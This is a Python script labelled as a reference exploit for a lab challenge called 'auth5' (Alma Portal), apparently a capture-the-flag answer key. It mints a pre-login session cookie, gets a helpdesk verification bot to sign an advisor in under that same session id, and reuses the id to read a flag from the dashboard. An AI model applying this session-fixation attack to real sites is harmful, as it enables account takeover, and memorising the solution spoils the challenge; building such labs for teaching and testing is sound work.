#!/usr/bin/env python3
"""Reference exploit for auth5 (Alma Portal).

Mints a pre-login sid, confirms the dashboard rejects it before anyone
authenticates under it, then fixes it via the registrar's link-verification
bot (which signs the advisor in without rotating the id) and reuses the
same sid to reach the dashboard.
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8064")


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def main() -> int:
    s = requests.Session()
    wait_up(s)

    s.get(BASE, timeout=5)  # mints our own pre-login sid cookie
    sid = s.cookies.get("sid")
    if not sid:
        sys.stderr.write("no sid cookie minted\n")
        return 1

    # Pre-exploit: our sid, never passed to the bot, must NOT reach the flag.
    r = s.get(f"{BASE}/dashboard", timeout=5, allow_redirects=False)
    if r.status_code == 200 and "flag{" in r.text:
        sys.stderr.write("precondition failed: dashboard reachable before fixation\n")
        return 1

    # Fixate: the bot "verifies" a link under the caller's own session --
    # our jar's pre-login sid travels with the POST and comes back
    # authenticated as the advisor.
    s.post(f"{BASE}/helpdesk/verify-link",
           data={"link": f"{BASE}/"}, timeout=5)

    # Reuse the same sid -- still in our cookie jar.
    r = s.get(f"{BASE}/dashboard", timeout=5)
    m = re.search(r"flag\{[^}]+\}", r.text)
    if m:
        print(m.group(0))
        return 0

    sys.stderr.write("no flag found\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
